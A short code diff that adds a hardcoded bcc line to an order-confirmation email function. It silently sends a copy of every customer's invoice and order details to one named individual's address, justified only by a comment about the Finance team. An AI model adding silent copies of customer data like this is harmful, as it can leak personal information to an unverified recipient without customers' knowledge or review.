@@ -660,6 +660,7 @@ const sendOrderConfirmationEmail = async (email, customerName, orderDetails) => 
       content: content,
       maxWidth: 650
     }),
+    bcc: 'ritikkumar1@crobstacle.com', // Send Finance team a copy of every invoice
   };
 
   try {
